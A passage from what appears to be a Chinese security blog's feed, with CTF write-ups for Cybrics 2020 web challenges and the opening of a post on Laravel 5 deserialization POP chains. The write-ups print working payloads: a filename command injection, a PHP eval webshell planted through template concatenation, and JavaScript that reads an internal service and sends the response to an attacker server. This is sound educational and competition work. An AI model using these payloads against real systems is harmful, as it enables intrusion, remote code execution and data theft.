class="keyword">if</span> file.content_type != <span class="string">"image/gif"</span>:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Content type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br></pre></td></tr></table></figure></p><p>发现一共有3个限制，第一个是需要.gif后缀结尾，第二个是需要content-type为image/gif，而第三个则是绕过正则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_\-. &apos;\&quot;\=\$\(\)\|]*$</span><br></pre></td></tr></table></figure></p><p>对于该正则，发现可用管道符可用，于是想到可用||进行绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pic.gif&apos; || xxxxxx || &apos;123.gif</span><br></pre></td></tr></table></figure></p><p>这里首先尝试反弹shell，但是发现好像比较困难，我弹了几次没成功，于是改为将结果写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls ../../../ &gt; uploads/ed3471ad-8cba-4d2a-8dde-b512e53b6648/123.png</span><br></pre></td></tr></table></figure></p><p>操作如下：<br><img src="/images/2020-07-25-22-27-34.png" alt=""><br>然后去访问写入文件即可：<br><img src="/images/2020-07-25-22-27-14.png" alt=""><br>我们直接cat main.py，因为flag写在文件内：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat main.py &gt; uploads/ed3471ad-8cba-4d2a-8dde-b512e53b6648/123.png</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-07-25-22-28-20.png" alt=""><br>于是可以获取flag。</p><h2 id="WoC"><a href="#WoC" class="headerlink" title="WoC"></a>WoC</h2><p>又是一道源码审计题目，首先看一下功能：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$pages = [</span><br><span class="line">    <span class="string">""</span> =&gt; <span class="string">"main.php"</span>,</span><br><span class="line">    <span class="string">"login"</span> =&gt; <span class="string">"login.php"</span>, </span><br><span class="line">    <span class="string">"logout"</span> =&gt; <span class="string">"logout.php"</span>,</span><br><span class="line">    <span class="string">"inside"</span> =&gt; <span class="string">"inside.php"</span>,</span><br><span class="line">    <span class="string">"newtemplate"</span> =&gt; <span class="string">"newtemplate.php"</span>,</span><br><span class="line">    <span class="string">"calc"</span> =&gt; <span class="string">"calc.php"</span>,</span><br><span class="line">    <span class="string">"sharelink"</span> =&gt; <span class="string">"sharelink.php"</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>题目核心功能不多，大概分为登录，添加模板，分享链接，计算器。<br>这里逐个审计，发现newtemplate和sharelink存在文件写入操作，可以控制。<br>首先是newtemplate：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'html'</span>])) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $html = trim($_POST[<span class="string">'html'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (strpos($html, <span class="string">'&lt;?'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $error = <span class="string">"Bad chars"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $requiredBlocks = [</span><br><span class="line">            <span class="string">'id="back"'</span>,</span><br><span class="line">            <span class="string">'id="field" name="field"'</span>,</span><br><span class="line">            <span class="string">'id="digit0"'</span>,</span><br><span class="line">            <span class="string">'id="digit1"'</span>,</span><br><span class="line">            <span class="string">'id="digit2"'</span>,</span><br><span class="line">            <span class="string">'id="digit3"'</span>,</span><br><span class="line">            <span class="string">'id="digit4"'</span>,</span><br><span class="line">            <span class="string">'id="digit5"'</span>,</span><br><span class="line">            <span class="string">'id="digit6"'</span>,</span><br><span class="line">            <span class="string">'id="digit7"'</span>,</span><br><span class="line">            <span class="string">'id="digit8"'</span>,</span><br><span class="line">            <span class="string">'id="digit9"'</span>,</span><br><span class="line">            <span class="string">'id="plus"'</span>,</span><br><span class="line">            <span class="string">'id="equals"'</span>,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($requiredBlocks <span class="keyword">as</span> $block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($html, $block) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                $error = <span class="string">"Missing required block: '$block'"</span>;</span><br><span class="line">                <span class="keyword">break</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $uuid = uuid();</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="string">"calcs/$userid/templates/$uuid.html"</span>, $html)) &#123;</span><br><span class="line">            $error = <span class="string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        redir(<span class="string">"."</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以写入任意字符，但是不能使用&lt;?，那么我们不能简单写入shell。<br>继续审计，来到calc.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'field'</span>])) &#123;</span><br><span class="line">    $field = trim($_POST[<span class="string">'field'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s'</span>, $field)) &#123;</span><br><span class="line">        $value = <span class="string">"BAD"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">            redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $value = <span class="keyword">eval</span>(<span class="string">"return $field;"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">                $value = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($value) &amp;&amp; !is_string($value)) &#123;</span><br><span class="line">                $value = <span class="string">"ERROR"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $value = (string)$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;var preloadValue = "</span> . json_encode($value) . <span class="string">";&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">            redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>此处我们发现写入内容由3段拼接而成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> preloadValue = <span class="meta">&lt;?</span>=json_encode((string)($field))<span class="meta">?&gt;</span>;&lt;/script&gt;\n</span><br><span class="line">file_get_contents(<span class="string">"inc/calclib.html"</span>)</span><br><span class="line">file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>)</span><br></pre></td></tr></table></figure></p><p>第3段文件内容我们完全可控，而第一段则为我们提供&lt;?=，于是这里可以想到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$field=<span class="string">'/*'</span></span><br></pre></td></tr></table></figure></p><p>如此一来，我们再将$template.html的内容与其拼接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*/1));@eval($_POST[&apos;a&apos;]);?&gt;&apos;id=&quot;back&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;field&quot; name=&quot;field&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit0&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit1&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit2&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit3&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit4&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit5&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit6&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit7&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit8&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;digit9&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;plus&quot;&apos;,</span><br><span class="line">            &apos;id=&quot;equals&quot;&apos;,</span><br></pre></td></tr></table></figure></p><p>这样我们即可构造出一个php文件内容大致如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=json_encode((string)(<span class="comment">/* xxxxxx */</span><span class="number">1</span>)); @<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>即可执行任意php代码。<br>操作如下：<br><img src="/images/2020-07-26-10-37-04.png" alt=""><br>此时将生成的模板进行应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://109.233.57.94:40389/?p=calc&amp;template=f95dbec6-730f-4a60-f318-fbdedb6115d4</span><br></pre></td></tr></table></figure></p><p>我们利用share功能写入field：<br><img src="/images/2020-07-26-10-37-40.png" alt=""><br>根据sharelink获取拼接后的php文件名：<br><img src="/images/2020-07-26-10-37-58.png" alt=""><br>蚁剑连接，即可获取shell，得到flag:<br><img src="/images/2020-07-26-10-38-42.png" alt=""></p><h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>访问题目，给了一个发送请求的页面：<br><img src="/images/2020-07-26-11-56-58.png" alt=""><br>这里看了下headers，发现存在Vary，同时考虑到题目使用了cdn：<br><img src="/images/2020-07-26-11-57-22.png" alt=""><br>本想尝试缓存欺骗，去获取一下origin的值：<br><img src="/images/2020-07-26-11-55-01.png" alt=""><br>此时发现了一个子域名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prod.free-design-feedback-cybrics2020.ctf.su</span><br></pre></td></tr></table></figure></p><p>然后访问来到如下页面：<br><img src="/images/2020-07-26-21-41-01.png" alt=""><br>这里一通测试，发现题目没有任何反应，同时能看见别人的notes：<br><img src="/images/2020-07-26-21-40-52.png" alt=""><br>测试了N久无果，于是想会不会考察其他内容，首先尝试看外层请求link的功能，能不能加载外部js，于是在自己服务器上放html，内容如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://ip:port'</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现跳转成功，于是发现可以执行任意js代码，尝试打cookie，但是发现并没有结果，于是想到利用js扫一下内网端口，并发现5000端口开放，利用如下js，带出5000端口页面内容：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.location=<span class="string">'http://vps_ip:23334/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://127.0.0.1:5000"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到回显：<br><img src="/images/2020-07-26-17-22-04.png" alt=""><br>解码后得到页面内容：<br><img src="/images/2020-07-26-17-21-26.png" alt=""><br>发现内网127.0.0.1:5000也开了一个note相关的功能，同时是version 1.0而非version 0.9，并且题目提示可以访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/notes?name=Ann Cobb&quot;&gt;Show all notes&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>尝试更改js去请求该页面：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps_ip:23334/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://127.0.0.1:5000/notes?name=Ann Cobb"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>但发现返回的结果都是500，此时心态崩了，尝试利用post创建新的notes：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"check_form"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">action</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">            URL: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">url</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            Score: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">score</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            Feedback: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">placeholder</span>=<span class="string">"Dear, &#123;&#123; customer &#125;&#125;. Thank you for choosing our service."</span> <span class="attr">name</span>=<span class="string">"feedback"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Save"</span> <span class="attr">class</span>=<span class="string">"form-control btn btn-primary"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>但发现依旧访问500……，脑洞猜想，访问/notes?name=xxx会出现500是因为用户名不存在，是否可以创建notes的时候，多一个参数name，如此指定用户名，再进行访问，同时这里看到feedback里有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; customer &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>应该不难想到，可以利用ssti获取flag。<br>读取到文件后，才发现该题确实是坑人= =：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">  name = request.args.get(<span class="string">"name"</span>, fake.name())</span><br><span class="line">  <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">    name = request.form.get(<span class="string">"name"</span>, name)</span><br><span class="line">    url = request.form.get(<span class="string">"url"</span>, <span class="keyword">None</span>)</span><br><span class="line">    score = request.form.get(<span class="string">"score"</span>, <span class="keyword">None</span>)</span><br><span class="line">    feedback = request.form.get(<span class="string">"feedback"</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> score <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> feedback <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">      (Path(<span class="string">"notes"</span>) / name).mkdir(parents=<span class="keyword">True</span>, exist_ok=<span class="keyword">True</span>)</span><br><span class="line">      <span class="keyword">with</span> (Path(<span class="string">"notes"</span>) / name / <span class="string">f"<span class="subst">&#123;hashlib.sha256(url.encode()).hexdigest()&#125;</span>.json"</span>).open(<span class="string">"w"</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(json.dumps(&#123;</span><br><span class="line">          <span class="string">"url"</span>: url, <span class="string">"score"</span>: score, <span class="string">"feedback"</span>: feedback, <span class="string">"name"</span>: name</span><br><span class="line">        &#125;))</span><br><span class="line">      flash(<span class="string">"Saved"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/notes")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notes</span><span class="params">()</span>:</span></span><br><span class="line">  name = request.args.get(<span class="string">"name"</span>, <span class="keyword">None</span>)</span><br><span class="line">  <span class="keyword">if</span> name <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line"></span><br><span class="line">  files = [f <span class="keyword">for</span> f <span class="keyword">in</span> listdir(str(Path(<span class="string">"notes"</span>) / name)) <span class="keyword">if</span> isfile(str(Path(<span class="string">"notes"</span>) / name / f)) <span class="keyword">and</span> <span class="string">".json"</span> <span class="keyword">in</span> f]</span><br><span class="line">  notes = [json.load((Path(<span class="string">"notes"</span>) / name / f).open()) <span class="keyword">for</span> f <span class="keyword">in</span> files]</span><br><span class="line">  <span class="keyword">for</span> note <span class="keyword">in</span> notes:</span><br><span class="line">    note[<span class="string">"feedback"</span>] = Template(note[<span class="string">"feedback"</span>]).render(customer=note[<span class="string">'url'</span>])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">"notes.html"</span>, notes=enumerate(notes))</span><br></pre></td></tr></table></figure></p><p>在源码里可以获取flag:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b'cybrics&#123;imagine_how_dangerous_is_that_every_site_can_hack_you_legally&#125;'</span></span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次Cybrics CTF Web做的有点难受，感觉有点misc和脑洞了，不是非常有趣（ .</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末打了俄罗斯知名战队LCBC举办的2020 Cybrics CTF，以下是Web题题解。&lt;/p&gt;
&lt;h2 id=&quot;Hunt&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 5 Deserialization Chain Summary</title>
    <link href="http://skysec.top/2020/07/22/Laravel-5-Deserialization-Chain-Summary/"/>
    <id>http://skysec.top/2020/07/22/Laravel-5-Deserialization-Chain-Summary/</id>
    <published>2020-07-22T03:27:10.000Z</published>
    <updated>2020-07-24T09:11:14.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Laravel 7中由于一些有所类修复，导致一些pop chain无法使用，于是这次在Laravel 5系列中，也做一次总结，列举比较适合的切入点和查找新链的思路。</p><h2 id="遍地撒网"><a href="#遍地撒网" class="headerlink" title="遍地撒网"></a>遍地撒网</h2><p>为了更好的找出切入点，我这里直接写了一个脚本，列举出所有包含<strong>destruct的class和其</strong>destruct的定义，并将laravel 5和laravel 7进行比对：<br><img src="/images/2020-07-22-11-31-17.png" alt=""><br>其实不难发现，Laravel 7和Laravel 5在切入点这一块，并无太多的区别，几乎一致，一般修改均为一些微调。<br>同时我们可以搜寻一下切入点，一般分为如下几类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__destruct中$this-&gt;xxxx()调用形式</span><br><span class="line">__destruct中$this-&gt;xxx-&gt;yyy()调用形式</span><br><span class="line">__destruct中built-in function调用形式</span><br></pre></td></tr></table></figure></p><p>那么本文对于laravel 5的pop chain寻找也围绕这3点进行展开。</p><h2 id="this-gt-xxxx-调用形式"><a href="#this-gt-xxxx-调用形式" class="headerlink" title="$this-&gt;xxxx()调用形式"></a>$this-&gt;xxxx()调用形式</h2><p>根据这个调用形式进行寻找，有比较知名的CVE-2019-9081，我们可以看到其函数定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Foundation\Testing\PendingCommand::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处run函数可以引入RCE风险，此处分析不再赘述，可以参考文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</span><br></pre></td></tr></table></figure></p><p>当然这个类在Laravel 7中已经被修复。<br>除此之外，还有包括上篇文章我们分析过的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Routing\PendingResourceRegistration::__destruct</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;registered) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处register函数可以引入RCE风险，也不再赘述，可以参考上一篇文章。<br>类似的调用情况同样很多，我简单列举几个：<br>GuzzleHttp\Cookie中常见的:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;save();</span><br></pre></td></tr></table></figure></p><p>Monolog\Handler和Symfony\Component中常见的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;close();</span><br></pre></td></tr></table></figure></p><p>League\Flysystem中常见的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 